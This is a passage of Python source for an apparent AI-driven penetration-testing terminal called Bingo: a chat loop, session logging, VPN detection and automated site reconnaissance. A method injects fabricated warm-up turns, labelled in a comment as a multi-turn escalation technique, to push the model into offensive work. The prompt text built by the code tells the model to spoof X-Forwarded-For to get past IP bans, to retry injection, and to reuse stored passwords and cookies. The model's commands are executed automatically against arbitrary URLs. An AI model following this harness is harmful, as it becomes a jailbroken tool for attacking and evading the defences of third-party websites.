from __future__ import annotations
import os
import sys
import time
import threading
from datetime import datetime
from pathlib import Path
from typing import Iterator

from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.columns import Columns
from rich.table import Table
from rich.live import Live
from rich.spinner import Spinner
from rich.markdown import Markdown
from rich.rule import Rule
from rich.prompt import Prompt
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.styles import Style as PTStyle
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.completion import Completer, Completion, WordCompleter

from ..models.base import Message, StreamChunk
from ..lang.strings import get_strings, get_slash_commands, SUPPORTED_LANGS
from ..i18n import t

# ── 색상 팔레트 (해커 그린 테마) ──────────────────────────────────
THEME = {
    "primary":   "#00ff41",   # 매트릭스 그린
    "secondary": "#00d4aa",   # 시안
    "accent":    "#ff6b35",   # 오렌지 (강조)
    "dim":       "#4a4a4a",
    "user_bg":   "#0d1117",
    "ai_bg":     "#0d1117",
    "border":    "#00ff41",
    "error":     "#ff3333",
    "warn":      "#ffcc00",
    "success":   "#00ff41",
}

BANNER = r"""
[#00ff41]
  ██████╗ ██╗███╗   ██╗ ██████╗  ██████╗ 
  ██╔══██╗██║████╗  ██║██╔════╝ ██╔═══██╗
  ██████╔╝██║██╔██╗ ██║██║  ███╗██║   ██║
  ██╔══██╗██║██║╚██╗██║██║   ██║██║   ██║
  ██████╔╝██║██║ ╚████║╚██████╔╝╚██████╔╝
  ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ [/#00ff41]
[#00d4aa]  AI Terminal  ·  v2.3.4  ·  Multi-Model[/#00d4aa]
"""

PT_STYLE = PTStyle.from_dict({
    "": "#00ff41",
    "prompt": "#00ff41 bold",
})


class _SlashCompleter(Completer):
    """/ 입력 시 슬래시 명령어 자동완성 (현재 언어 기준 설명)"""

    def __init__(self, lang_getter):
        # lang_getter: 현재 언어 코드를 반환하는 callable (lambda: self.config.lang)
        self._lang_getter = lang_getter

    def get_completions(self, document, complete_event):
        text = document.text_before_cursor
        if not text.startswith("/"):
            return
        word = text.split()[0] if text.split() else "/"
        commands = get_slash_commands(self._lang_getter())
        for cmd, desc in commands:
            if cmd.startswith(word) or word == "/":
                yield Completion(
                    cmd,
                    start_position=-len(word),
                    display=cmd,
                    display_meta=desc,
                )


class BingoTerminal:
    """Bingo 메인 터미널 UI"""

    def __init__(self, config, strings: dict):
        self.config = config
        self.s = strings
        # 전역 i18n 언어 동기화
        try:
            from ..i18n import set_lang
            set_lang(getattr(config, "lang", "en"))
        except Exception:
            pass
        self.console = Console(highlight=False)
        self.history: list[Message] = []
        self._session: PromptSession | None = None
        # 자동 저장 경로 — 세션 시작 시 결정
        self._session_log_path: Path | None = None
        # 인증 세션 — /login 성공 시 저장, AI 컨텍스트에 자동 주입
        self._auth_session: dict = {
            "login_url": "",
            "username": "",
            "password": "",
            "cookies": {},      # {name: value}
            "evidence": "",     # VERIFIED / LIKELY / INFERRED
            "active": False,
        }
        # 자동 크랙 중단 플래그
        self._stop_crack_flag = threading.Event()
        # Agent 루프 중단 플래그 (Ctrl+C)
        self._agent_stop_flag = threading.Event()
        # Agent 누적 상태 — 슬라이딩 윈도우에 잘려도 보존
        self._agent_state_path = Path.home() / ".config" / "bingo" / "agent_state.json"
        self._agent_state: dict = self._load_agent_state()
        # 롤백 매니저
        from ..core.rollback import RollbackManager
        self._rollback = RollbackManager()
        # 파일시스템 감시
        from ..core.file_watcher import AgentOutputWatcher
        self._file_watcher = AgentOutputWatcher(console=self.console)
        self._file_watcher.start()
        # 토큰 / 비용 추적
        self._token_usage: dict = {"prompt": 0, "completion": 0, "total": 0}
        self._cost_usd: float = 0.0
        # Agent 루프 카운터 — 슬라이딩 윈도우 영향 받지 않는 전용 카운터
        self._exec_loop_count: int = 0
        # Stuck 감지 — 마지막 N개 결과의 해시값 (반복 시 자동 전략 전환)
        self._recent_results: list[str] = []
        self._stuck_count: int = 0
        # 네트워크 환경 (VPN 감지 결과 캐싱)
        self._net_env: dict = {}
        self._detect_network_env()
        # /retry 용 마지막 실행 결과 캐시
        self._last_exec_result: str = ""

    # ── 네트워크 환경 감지 (VPN 자동 판단) ───────────────────────
    def _detect_network_env(self) -> None:
        """VPN 사용 여부를 자동 판단하고 실제 출구 IP를 조회."""
        import socket, threading

        def _probe():
            result = {
                "local_ip": "",
                "public_ip": "",
                "vpn_detected": False,
                "vpn_interface": "",
                "country": "",
            }
            try:
                # 로컬 IP 조회 (DNS 쿼리 방식 — 실제 연결 없이)
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as _s:
                    _s.connect(("8.8.8.8", 80))
                    result["local_ip"] = _s.getsockname()[0]
            except Exception:
                result["local_ip"] = "unknown"

            # VPN 판단: 로컬 IP가 tun/vpn 대역인지 확인
            _lip = result["local_ip"]
            _vpn_ranges = [
                ("10.", "Private/VPN"),
                ("172.16.", "VPN"),("172.17.", "VPN"),("172.18.", "VPN"),
                ("172.19.", "VPN"),("172.20.", "VPN"),("172.30.", "VPN"),
                ("172.31.", "VPN"),
                ("100.64.", "Tailscale/VPN"),("100.65.", "Tailscale/VPN"),
                ("100.100.", "Tailscale/VPN"),
            ]
            # 192.168.x.x 는 일반 공유기도 포함이므로 별도 체크
            _is_192 = _lip.startswith("192.168.")

            vpn_hint = ""
            for prefix, label in _vpn_ranges:
                if _lip.startswith(prefix):
                    vpn_hint = label
                    break

            # 외부 API로 실제 출구 IP 조회 (여러 서비스 폴백)
            _public_ip = ""
            _country = ""
            _ip_apis = [
                "https://api.ipify.org",
                "https://ipv4.icanhazip.com",
                "https://api4.my-ip.io/ip",
                "https://checkip.amazonaws.com",
            ]
            import ssl as _ssl, urllib.request as _ur
            _ctx = _ssl.create_default_context()
            _ctx.check_hostname = False
            _ctx.verify_mode = _ssl.CERT_NONE
            for _api in _ip_apis:
                try:
                    _req = _ur.Request(_api, headers={"User-Agent": "curl/7.88.1"})
                    with _ur.urlopen(_req, timeout=4, context=_ctx) as _r:
                        _public_ip = _r.read().decode().strip().split("\n")[0]
                    if _public_ip:
                        break
                except Exception:
                    continue

            # 국가 정보 조회 (ip-api.com)
            if _public_ip:
                try:
                    _cr = _ur.Request(
                        f"http://ip-api.com/json/{_public_ip}?fields=country,countryCode,isp",
                        headers={"User-Agent": "curl/7.88.1"}
                    )
                    import json as _json
                    with _ur.urlopen(_cr, timeout=4) as _cr_resp:
                        _geo = _json.loads(_cr_resp.read().decode())
                    _country = f"{_geo.get('countryCode','?')} / {_geo.get('isp','')[:30]}"
                except Exception:
                    _country = ""

            result["public_ip"] = _public_ip
            result["country"] = _country

            # VPN 최종 판단: 로컬 IP ≠ 공개 IP 이면서 VPN 대역 OR tun 인터페이스 존재
            _is_vpn = False
            _vpn_iface = ""
            try:
                import subprocess as _sp
                _ifout = _sp.check_output(["ifconfig"], text=True, timeout=3)
                for _iface_name in ("tun", "tap", "utun", "wg", "vpn", "ppp", "ipsec"):
                    if _iface_name in _ifout.lower():
                        _is_vpn = True
                        _vpn_iface = _iface_name
                        break
            except Exception:
                pass

            if vpn_hint:
                _is_vpn = True
                _vpn_iface = vpn_hint

            # 공개 IP가 로컬 IP와 다른 경우 (NAT/VPN)
            if _public_ip and _public_ip != _lip and not _lip.startswith("192.168."):
                _is_vpn = True

            result["vpn_detected"] = _is_vpn
            result["vpn_interface"] = _vpn_iface
            self._net_env = result

        # 백그라운드에서 조회 (시작 속도에 영향 없음)
        threading.Thread(target=_probe, daemon=True).start()

    def _get_net_env_line(self) -> str:
        """배너/상태줄용 네트워크 환경 한 줄 요약"""
        env = self._net_env
        if not env:
            return ""
        pub = env.get("public_ip", "")
        local = env.get("local_ip", "")
        vpn = env.get("vpn_detected", False)
        iface = env.get("vpn_interface", "")
        country = env.get("country", "")

        if vpn:
            _txt = self.s.get("vpn_on_banner", "🔒 VPN ON  Exit IP: {ip}  {country}  (local: {local})")
            return f"[{THEME['warn']}]{_txt.format(ip=pub, country=country, local=local)}[/]"
        elif pub:
            _txt = self.s.get("vpn_off_banner", "🌐 Public IP: {ip}  {country}")
            return f"[{THEME['dim']}]{_txt.format(ip=pub, country=country)}[/]"
        return ""

    # ── 공개 진입점 ───────────────────────────────────────────────
    def run(self) -> None:
        import signal

        # Ctrl+C → 에이전트 루프 안전 중단 (프로그램 종료 아님)
        def _sigint_handler(sig, frame):
            if self._agent_stop_flag.is_set():
                # 두 번 누르면 완전 종료
                # (stderr 사용 — Live/Rich 컨텍스트와 충돌 없음)
                import sys as _sys
                _sys.stderr.write("\n⚡ Force quit\n")
                _sys.stderr.flush()
                raise SystemExit(0)
            self._agent_stop_flag.set()
            self._stop_crack_flag.set()
            # ★ 메시지는 stderr로 — Live(transient=True) 컨텍스트에 의해 지워지지 않음
            import sys as _sys
            _sys.stderr.write("\n⚠  Ctrl+C — 스트림 중단 중...\n")
            _sys.stderr.flush()

        signal.signal(signal.SIGINT, _sigint_handler)

        self._clear()
        self._print_banner()
        self._init_session()
        self._init_session_log()

        if not self.config.get_active_model_config():
            self._warn(self.s["no_model_configured"])
            self._cmd_model()

        # 이전 세션 이어하기 제안
        _resumed = self._offer_resume()

        self._inject_warmup_history()

        if _resumed:
            # 복원된 경우 → 자동으로 에이전트 재개 메시지 주입
            _lang = getattr(self.config, "lang", "en")
            _auto_continue = {
                "ko": f"이전 작업을 이어서 계속 진행해 주세요. 타겟: {self._agent_state.get('target') or ''}",
                "zh": f"请继续上次未完成的工作。目标: {self._agent_state.get('target') or ''}",
                "en": f"Continue the previous task from where it was left off. Target: {self._agent_state.get('target') or ''}",
            }.get(_lang, "Continue previous task.")
            # 자동 재개 — chat_loop 거치지 않고 직접 AI 호출
            from ..models.registry import ModelRegistry
            model_cfg = self.config.get_active_model_config()
            if model_cfg:
                self.history.append(Message(role="user", content=_auto_continue))
                self._append_to_session_log("user", _auto_continue)
                model = ModelRegistry.build(model_cfg)
                response = self._stream_response(
                    model.chat_stream(self._build_messages(""))
                )
                if response:
                    self.history.append(Message(role="assistant", content=response))
                    self._append_to_session_log("assistant", response)
                    self._execute_ai_commands(response)

        self._chat_loop()

    # ── 배너 / 상태 표시 ──────────────────────────────────────────
    def _print_banner(self) -> None:
        self.console.print(BANNER)
        model_cfg = self.config.get_active_model_config()
        status = f"[{THEME['secondary']}]{model_cfg.display_name()}[/]" if model_cfg else f"[{THEME['warn']}]no model[/]"
        lang_label = SUPPORTED_LANGS.get(self.config.lang, self.config.lang)
        # 전체 스킬 수 (hack-skills 102 + 내장 6 + local 5 + DB 235)
        _hs_dir = Path(__file__).parent.parent / "skills" / "hack-skills"
        _hs_count = sum(1 for d in _hs_dir.iterdir() if d.is_dir() and (d / "SKILL.md").exists()) if _hs_dir.exists() else 0
        try:
            from ..skills.skills_data import SKILLS_DB
            from ..skills.skills_data2 import SKILLS_DB_2
            from ..skills.skills_data3 import SKILLS_DB_3
            _db_count = len({**SKILLS_DB, **SKILLS_DB_2, **SKILLS_DB_3})
        except Exception:
            _db_count = 0
        _total = _hs_count + 6 + 5 + _db_count
        self.console.print(
            f"  [{THEME['dim']}]lang:[/] {lang_label}   "
            f"[{THEME['dim']}]model:[/] {status}   "
            f"[{THEME['dim']}]skills:[/] [{THEME['success']}]{_total} ready[/]\n"
        )
        # 네트워크 환경 표시 (VPN 감지 결과 — 백그라운드 조회 완료 대기 최대 2s)
        import time as _t
        for _ in range(20):
            if self._net_env:
                break
            _t.sleep(0.1)
        _net_line = self._get_net_env_line()
        if _net_line:
            self.console.print(f"  {_net_line}\n")

    def _print_status_bar(self) -> None:
        model_cfg = self.config.get_active_model_config()
        name = model_cfg.display_name() if model_cfg else "—"
        now = datetime.now().strftime("%H:%M")
        self.console.print(
            Rule(
                f"[{THEME['dim']}]{name}  ·  {now}[/]",
                style=THEME["dim"],
            )
        )

    # ── 세션 로그 ─────────────────────────────────────────────────
    def _init_session_log(self) -> None:
        """세션 시작 시 자동 저장 경로 초기화"""
        logs_dir = Path.home() / ".config" / "bingo" / "sessions"
        logs_dir.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self._session_log_path = logs_dir / f"session_{ts}.md"
        # 헤더 기록
        model_cfg = self.config.get_active_model_config()
        model_name = model_cfg.display_name() if model_cfg else "unknown"
        header = (
            f"# Bingo Session — {ts}\n"
            f"**model:** {model_name}\n\n"
            "---\n\n"
        )
        self._session_log_path.write_text(header, encoding="utf-8")
        self.console.print(
            f"[{THEME['dim']}]{self.s['session_saved']}: {self._session_log_path}[/]\n"
        )

    def _append_to_session_log(self, role: str, content: str) -> None:
        """대화 한 턴을 세션 로그에 추가"""
        if not self._session_log_path:
            return
        try:
            ts = datetime.now().strftime("%H:%M:%S")
            label = "**YOU**" if role == "user" else "**bingo**"
            with open(self._session_log_path, "a", encoding="utf-8") as f:
                f.write(f"### {label} `{ts}`\n{content}\n\n")
        except Exception:
            pass

    # ── 채팅 루프 ─────────────────────────────────────────────────
    def _chat_loop(self) -> None:
        _ctrl_c_count = 0  # 연속 Ctrl+C 횟수 추적
        while True:
            try:
                user_input = self._get_input()
                _ctrl_c_count = 0  # 입력 성공 시 카운터 초기화
            except KeyboardInterrupt:
                _ctrl_c_count += 1
                if _ctrl_c_count >= 2:
                    # 연속 2회 Ctrl+C → 진짜 종료
                    self.console.print(f"\n[{THEME['primary']}]{self.s['goodbye']}[/]")
                    if self._session_log_path:
                        self.console.print(
                            f"[{THEME['dim']}]{self.s['session_done']}: {self._session_log_path}[/]"
                        )
                    break
                # 1회 Ctrl+C → 입력 취소, 루프 계속
                _lang = getattr(self.config, "lang", "en")
                _cancel_msg = {
                    "ko": "(입력 취소 — 다시 입력하거나 Ctrl+C 한 번 더 누르면 종료)",
                    "zh": "(输入已取消 — 重新输入或再按一次 Ctrl+C 退出)",
                    "en": "(Input cancelled — type again or press Ctrl+C once more to quit)",
                }.get(_lang, "(Ctrl+C again to quit)")
                self.console.print(f"\n[{THEME['dim']}]{_cancel_msg}[/]")
                continue
            except EOFError:
                self.console.print(f"\n[{THEME['primary']}]{self.s['goodbye']}[/]")
                if self._session_log_path:
                    self.console.print(
                        f"[{THEME['dim']}]{self.s['session_done']}: {self._session_log_path}[/]"
                    )
                break

            if not user_input.strip():
                continue

            # 슬래시 명령어
            if user_input.startswith("/"):
                self._handle_command(user_input.strip())
                continue

            # 자연어 자격증명 파싱 — "아이디 admin 비번 1234 로그인해줘" 형태 자동 감지
            self._try_natural_language_login(user_input)

            # 일반 메시지 → AI 응답
            self._send_message(user_input.strip())

    def _get_input(self) -> str:
        model_cfg = self.config.get_active_model_config()
        model_name = model_cfg.display_name() if model_cfg else "no-model"
        return self._session.prompt(
            HTML(f'<ansigreen><b>❯</b></ansigreen> '),
            style=PT_STYLE,
        )

    # ────────────────────────────────────────────────────────────────
    # 실행 루프 중 힌트 입력 — Ctrl+C 후 힌트 주면 루프 유지
    # ────────────────────────────────────────────────────────────────
    def _prompt_mid_task_hint(self) -> "str | None":
        """Ctrl+C 눌렀을 때 힌트를 입력받고 반환.
        빈 입력 → None (루프 중단), 텍스트 입력 → 힌트 주입 후 루프 계속.
        """
        _lang = getattr(self.config, "lang", "en")
        _pause_msg = {
            "ko": (
                "⚡ [bold]루프 일시정지[/bold] — 힌트를 입력하면 중단 없이 계속 진행\n"
                "   (그냥 Enter 또는 Ctrl+C 한 번 더 → 완전 중단)"
            ),
            "zh": (
                "⚡ [bold]循环暂停[/bold] — 输入提示则继续执行\n"
                "   (直接回车或再按Ctrl+C → 完全停止)"
            ),
            "en": (
                "⚡ [bold]Loop paused[/bold] — type a hint to keep going\n"
                "   (press Enter or Ctrl+C again → stop completely)"
            ),
        }.get(_lang, "⚡ Loop paused — type hint or Enter to stop")
        self.console.print(f"\n[{THEME['warn']}]{_pause_msg}[/]\n")
        try:
            hint = self._session.prompt(
                HTML('<ansiyellow><b>💬 hint ❯</b></ansiyellow> '),
                style=PT_STYLE,
            )
            return hint.strip() if hint.strip() else None
        except (EOFError, KeyboardInterrupt):
            return None

    # ── 메시지 전송 + 스트리밍 출력 ──────────────────────────────
    def _inject_warmup_history(self) -> None:
        """세션 시작 시 워밍업 대화를 히스토리에 주입 (멀티턴 에스컬레이션 기법)"""
        from ..models.system_prompt import get_warmup_history
        model_cfg = self.config.get_active_model_config()
        provider = model_cfg.provider if model_cfg else "deepseek"
        for msg in get_warmup_history(provider):
            self.history.append(Message(role=msg["role"], content=msg["content"]))

    def _get_system_message(self, skill_context: str = "") -> Message:
        """모델 공급자에 맞는 시스템 프롬프트 반환 (스킬 컨텍스트 포함)"""
        from ..models.system_prompt import get_pentest_system_prompt
        model_cfg = self.config.get_active_model_config()
        provider = model_cfg.provider if model_cfg else "deepseek"
        system_text = get_pentest_system_prompt(provider)

        # 언어 설정을 시스템 프롬프트에 강제 주입 (매 요청마다)
        _lang = getattr(self.config, "lang", "en")
        _lang_label = {"ko": "Korean", "zh": "Chinese (Simplified, 简体中文)", "en": "English"}.get(_lang, "English")
        system_text += (
            f"\n\n[ABSOLUTE LANGUAGE RULE — TOP PRIORITY]\n"
            f"User language setting: {_lang_label} (code={_lang})\n"
            f"EVERY word of your response MUST be in {_lang_label} only. "
            f"Do NOT use Korean unless lang=ko. Do NOT mix languages.\n"
        )

        if skill_context:
            system_text += "\n\n---\n## RELEVANT SKILL REFERENCES\n" + skill_context

        # ── 인증 세션 자동 주입 ─────────────────────────────────────
        if getattr(self, "_auth_session", {}).get("active"):
            auth = self._auth_session
            cookie_str = "; ".join(f"{k}={v}" for k, v in auth["cookies"].items())
            cookie_dict = repr(auth["cookies"])
            system_text += (
                f"\n\n---\n## AUTHENTICATED SESSION [{auth['evidence']}]\n"
                f"The user has already logged in. Use these credentials/cookies in ALL HTTP requests.\n"
                f"- Login URL : {auth['login_url']}\n"
                f"- Username  : {auth['username']}\n"
                f"- Password  : {auth['password']}\n"
                f"- Cookie header: {cookie_str}\n"
                f"- As dict (for httpx/requests): {cookie_dict}\n\n"
                f"```python\n"
                f"# EXAMPLE — always include this in generated code:\n"
                f"import httpx\n"
                f"COOKIES = {cookie_dict}\n"
                f"HEADERS = {{\n"
                f'    "Cookie": "{cookie_str}",\n'
                f'    "User-Agent": "Mozilla/5.0",\n'
                f"}}\n"
                f"# Use COOKIES or HEADERS in every request\n"
                f"```\n"
                f"CRITICAL: Do NOT log in again. Use the stored session above directly."
            )

        return Message(role="system", content=system_text)

    def _get_skill_context(self, text: str) -> str:
        """사용자 입력에서 관련 스킬 자동 검색 후 AI 컨텍스트 문자열 반환.

        우선순위:
          1. bingo 내장 pentest SKILL.md 파일 (신규 — sqli/waf_bypass/api_security 등)
          2. SecSkills-main / advsec-plus 로컬 references/
          3. CyberSecurity-Skills 내장 DB (보조)
        """
        parts: list[str] = []

        # ── 1. bingo 내장 pentest 스킬 (새 시스템) ───────────────────
        builtin_ctx = self._detect_and_load_skills(text)
        if builtin_ctx:
            parts.append(builtin_ctx)

        # ── 2. 로컬 SecSkills references (기존) ──────────────────────
        try:
            from ..skills.engine import SkillEngine
            engine = SkillEngine()
            local_ctx = engine.local_skill_context(text, max_chars=2000)
            if local_ctx:
                parts.append(
                    "=== SKILL_CONTEXT (verified reference) ===\n"
                    + local_ctx
                    + "\n=== END SKILL_CONTEXT ==="
                )
            # ── 3. 내장 DB (보조) ─────────────────────────────────────
            if not local_ctx:
                results = engine.search(text)
                for r in results[:2]:
                    prompt = engine.get_skill_prompt(r["id"])
                    if prompt:
                        parts.append(prompt)
        except Exception:
            pass

        return "\n\n".join(parts)

    def _auto_waf_scan(self, text: str) -> str:
        """URL 감지 시 사이트 raw 데이터 수집 → AI가 전략 전부 결정.
        고정 공격 지시 없음. AI가 수집된 데이터 기반으로 자율 판단.
        """
        import re
        urls = re.findall(r"https?://[^\s\"'<>]+", text)
        if not urls:
            return ""

        url = urls[0].rstrip("/?,")
        results: list[str] = []

        # 네트워크 환경 확인 및 표시
        _env = self._net_env
        _pub_ip = _env.get("public_ip", "")
        _vpn_on = _env.get("vpn_detected", False)
        _vpn_iface = _env.get("vpn_interface", "")
        _country = _env.get("country", "")

        _net_note = ""
        if _vpn_on and _pub_ip:
            _net_note = (
                f"[NETWORK_ENV]\n"
                f"  VPN: ACTIVE ({_vpn_iface})\n"
                f"  Exit IP (what target sees): {_pub_ip}\n"
                f"  Location: {_country}\n"
                f"  Use X-Forwarded-For: {_pub_ip} to appear as real source\n"
                f"  NOTE: Target blocks by exit IP, not local IP"
            )
            self.console.print(
                f"\n[{THEME['warn']}]  {self.s.get('vpn_detected_scan', '🔒 VPN detected: Exit IP [{ip}] ({country})').format(ip=_pub_ip, country=_country)}[/]"
            )
        elif _pub_ip:
            _net_note = (
                f"[NETWORK_ENV]\n"
                f"  VPN: NOT detected\n"
                f"  Public IP: {_pub_ip}\n"
                f"  Location: {_country}"
            )

        self.console.print(
            f"\n[{THEME['warn']}]{self.s.get('site_recon', '🔍 Site recon')}: {url}[/]"
        )

        try:
            import httpx as _hx, re as _re
            from urllib.parse import urlparse, urljoin

            _hdrs = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                              "AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
            }

            # ── 1. 원본 URL 요청 (세션 쿠키 자동 수집) ─────────────────
            # follow_redirects=False 로 먼저 받아서 리다이렉트 패턴 분석
            resp_raw = _hx.get(url, headers=_hdrs, follow_redirects=False, timeout=12, verify=False)
            raw_status = resp_raw.status_code
            raw_location = resp_raw.headers.get("location", "")
            raw_cookies = dict(resp_raw.cookies)

            # 세션 쿠키 추출 (JSESSIONID, PHPSESSID 등)
            session_cookies: dict = {}
            for ck_name in ("JSESSIONID", "PHPSESSID", "ASP.NET_SessionId", "session", "sess"):
                if ck_name in raw_cookies:
                    session_cookies[ck_name] = raw_cookies[ck_name]
            # Set-Cookie 헤더에서도 추출
            for hdr_name, hdr_val in resp_raw.headers.items():
                if hdr_name.lower() == "set-cookie":
                    for ck_name in ("JSESSIONID", "PHPSESSID"):
                        if ck_name in hdr_val:
                            import re as _re2
                            m = _re2.search(rf"{ck_name}=([^;]+)", hdr_val)
                            if m:
                                session_cookies[ck_name] = m.group(1)

            # 세션 쿠키 포함해서 follow_redirects=True 재요청
            if session_cookies:
                _hdrs_with_session = {**_hdrs, "Cookie": "; ".join(f"{k}={v}" for k, v in session_cookies.items())}
            else:
                _hdrs_with_session = _hdrs

            resp = _hx.get(url, headers=_hdrs_with_session, follow_redirects=True, timeout=12, verify=False)
            page = resp.text
            orig_status = resp.status_code
            parsed_url = urlparse(resp.url)
            base_domain = parsed_url.scheme + "://" + parsed_url.netloc

            # ── IP 차단 / 전체 307 리다이렉트 감지 ──────────────────
            ip_block_note = ""
            if raw_status in (307, 302, 301) and len(page) < 500:
                # 루트도 확인해서 정말 IP 차단인지 인증 요구인지 구분
                _root = base_domain + "/"
                try:
                    _root_resp = _hx.get(_root, headers=_hdrs, follow_redirects=False, timeout=8, verify=False)
                    _root_status = _root_resp.status_code
                    _root_location = _root_resp.headers.get("location", "")
                except Exception:
                    _root_status = 0
                    _root_location = ""

                if _root_status in (307, 302) and len(_root_resp.text) < 500:
                    # 루트도 307 → IP 차단 또는 전체 인증 필요
                    ip_block_note = (
                        f"[!!! CRITICAL WARNING !!!]\n"
                        f"ALL requests return {raw_status} redirect (length={len(page)}B).\n"
                        f"Root also returns {_root_status} → {_root_location}\n"
                        f"POSSIBLE CAUSES:\n"
                        f"  1. IP BLOCKED/RATE LIMITED — your IP has been banned\n"
                        f"  2. AUTHENTICATION REQUIRED — site requires login for all pages\n"
                        f"  3. GEO BLOCK — site blocks foreign IPs\n"
                        f"REQUIRED ACTIONS:\n"
                        f"  - If IP blocked: wait 5-10 min, try different User-Agent or X-Forwarded-For\n"
                        f"  - If auth required: find login endpoint, get valid session cookie first\n"
                        f"  - Try: /login, /signin, /cms/com/login.do, /member/login.do\n"
                        f"  - With JSESSIONID: {session_cookies if session_cookies else 'not obtained yet'}\n"
                        f"DO NOT keep testing injection on 307 responses — oracle is always invalid on redirects.\n"
                        f"GET A VALID SESSION FIRST, then retry injection with that session cookie."
                    )
                    self.console.print(
                        f"[{THEME['error']}]  ⛔ 전체 307 감지 — IP 차단 또는 인증 필요. AI에게 세션 먼저 확보 지시.[/]"
                    )
                else:
                    # 특정 URL만 307 → 인증 필요
                    ip_block_note = (
                        f"[AUTH REDIRECT DETECTED]\n"
                        f"URL {url} returns {raw_status} → {raw_location}\n"
                        f"This specific URL requires authentication.\n"
                        f"Session cookies: {session_cookies if session_cookies else 'none'}\n"
                        f"ACTION: Find and use a public endpoint, or get session via login form first."
                    )

            # 404 감지 시 루트로 폴백 + 원래 파라미터 분석 정보 보존
            root_url = base_domain + "/"
            orig_param_info = ""
            if orig_status == 404 and url != root_url:
                from urllib.parse import parse_qs, urlparse as _up
                _p = _up(url)
                _params = parse_qs(_p.query)
                orig_param_info = (
                    f"[TARGET NOTE] Original URL {url} returned 404.\n"
                    f"Parameters found: {dict(_params)}\n"
                    f"Root URL {root_url} will be used for full site analysis.\n"
                    f"IMPORTANT: Test parameters from original URL on pages that return 200."
                )
                self.console.print(
                    f"[{THEME['warn']}]  {self.s.get('url_404_fallback', '⚠ {url} → 404').format(url=url, root=root_url)}[/]"
                )
                resp = _hx.get(root_url, headers=_hdrs, follow_redirects=True, timeout=12, verify=False)
                page = resp.text
                parsed_url = urlparse(resp.url)
                base_domain = parsed_url.scheme + "://" + parsed_url.netloc

            # 헤더 전체
            all_headers = dict(resp.headers)
            results.append(
                f"=== HTTP_RESPONSE ===\n"
                f"url: {resp.url}\n"
                f"original_url: {url}\n"
                f"raw_status_before_redirect: {raw_status}\n"
                f"raw_redirect_location: {raw_location}\n"
                f"status: {resp.status_code}\n"
                f"headers: {all_headers}\n"
                f"content_length: {len(page)}"
                + (f"\n{orig_param_info}" if orig_param_info else "")
            )
            # IP 차단 / 307 전체 경고
            if ip_block_note:
                results.append(f"=== IP_BLOCK_OR_AUTH_REQUIRED ===\n{ip_block_note}")
            # 세션 쿠키 전달
            if session_cookies:
                results.append(
                    f"=== SESSION_COOKIES (use in all requests) ===\n"
                    + "\n".join(f"  {k}={v}" for k, v in session_cookies.items())
                    + "\n  IMPORTANT: Include these cookies in ALL injection requests"
                )
            # ── CMS/기술스택 명시 감지 (AI 환각 방지) ───────────────
            _page_low = page.lower()[:5000]
            _hdr_low = str(all_headers).lower()
            _detected_cms = "UNKNOWN"
            _detected_lang = "UNKNOWN"

            # Java 감지
            if "jsessionid" in _hdr_low or ".do" in url or "jsessionid" in _page_low:
                _detected_cms = "Java/Spring/Struts"
                _detected_lang = "Java"
            # PHP 감지
            elif "phpsessid" in _hdr_low or ".php" in url or "phpsessid" in _page_low:
                _detected_lang = "PHP"
                if "gnuboard" in _page_low or "bo_table" in _page_low or "/bbs/" in _page_low:
                    _detected_cms = "Gnuboard (PHP)"
                elif "xe_" in _page_low or "xpressengine" in _page_low or "/xe/" in _page_low:
                    _detected_cms = "XpressEngine/XE (PHP)"
                elif "godo" in _page_low:
                    _detected_cms = "Godo Mall (PHP)"
                elif "wordpress" in _page_low or "wp-content" in _page_low:
                    _detected_cms = "WordPress (PHP)"
                else:
                    _detected_cms = "PHP (CMS unknown)"
            # ASP/ASPX 감지
            elif ".asp" in url or "__viewstate" in _page_low or "asp.net" in _hdr_low:
                _detected_lang = "ASP.NET"
                _detected_cms = "ASP.NET"

            # ── SPA catch-all 라우터 감지 ─────────────────────────
            # 모든 경로가 같은 크기로 200 응답 → SPA/프론트엔드 라우터
            _page_size = len(page)
            _spa_catchall = False
            if resp.status_code == 200 and _page_size > 1000:
                try:
                    import random as _rand
                    _test_paths = [
                        f"/nonexistent_page_{_rand.randint(10000,99999)}",
                        f"/fakepath_abc123/xyz",
                    ]
                    _same_size_count = 0
                    for _tp in _test_paths:
                        _tr = _hx.get(base_domain + _tp, headers=_hdrs, timeout=4, verify=False)
                        if abs(len(_tr.text) - _page_size) < 200:
                            _same_size_count += 1
                    if _same_size_count >= 2:
                        _spa_catchall = True
                        results.insert(0,
                            f"=== ⚠ SPA_CATCHALL_ROUTER DETECTED ===\n"
                            f"  All paths return same size (~{_page_size}B)\n"
                            f"  → This is a SPA (React/Vue/Angular) with frontend routing\n"
                            f"  → Path enumeration is USELESS — all 200s are fake\n"
                            f"  → Strategy: analyze HTML/JS for API endpoints, not file paths\n"
                            f"  → Look for: fetch('/api/...'), axios.get('/v1/...), GraphQL endpoints\n"
                            f"  → DO NOT try /admin/, /login/, /wp-admin/ — they all 'exist'"
                        )
                        self.console.print(
                            f"[{THEME['warn']}]  ⚠ SPA catch-all 라우터 감지 — 경로 탐색 무의미[/]"
                        )
                except Exception:
                    pass

            results.insert(0,
                f"=== ⚠ CONFIRMED_TECH_STACK (DO NOT ASSUME DIFFERENT) ===\n"
                f"  Language: {_detected_lang}\n"
                f"  CMS/Framework: {_detected_cms}\n"
                f"  {'CRITICAL: Java confirmed. NEVER use PHP paths (/bbs/board.php, bo_table, PHPSESSID etc.)' if _detected_lang == 'Java' else ''}\n"
                f"  {'CRITICAL: PHP/Gnuboard confirmed. NEVER use Java/.do endpoints.' if 'Gnuboard' in _detected_cms else ''}\n"
                f"  {'NOTE: Custom/unknown stack — no CMS detected. Analyze actual page structure only.' if _detected_cms == 'UNKNOWN' else ''}\n"
                f"\n"
                f"  ⚠ ANTI-ASSUMPTION RULE:\n"
